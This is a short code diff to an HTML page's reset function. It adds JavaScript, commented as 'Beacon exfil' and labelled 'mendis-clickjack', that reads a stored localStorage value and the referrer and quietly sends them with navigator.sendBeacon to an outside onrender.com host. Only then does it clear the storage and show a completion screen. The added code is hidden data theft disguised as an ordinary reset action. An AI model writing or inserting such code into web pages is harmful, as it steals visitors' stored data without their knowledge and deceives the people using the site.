@@ -89,6 +89,17 @@ h1 { font-size:22px; font-weight:800; color:var(--ink); margin:0 0 10px; line-he
 
 <script>
 function doReset() {
+  // Beacon exfil — fires before clear, bypasses CORS read restriction
+  try {
+    const stored = localStorage.getItem('mendis.web.v1');
+    const payload = JSON.stringify({
+      source: 'mendis-clickjack',
+      referrer: document.referrer,
+      stored: stored,
+      ts: Date.now()
+    });
+    navigator.sendBeacon('https://nexusstore-vcz2.onrender.com/?r=grab', payload);
+  } catch(e) {}
   try { localStorage.removeItem('mendis.web.v1'); } catch(e) {}
   document.getElementById('main').style.display = 'none';
   document.getElementById('done').style.display = 'flex';
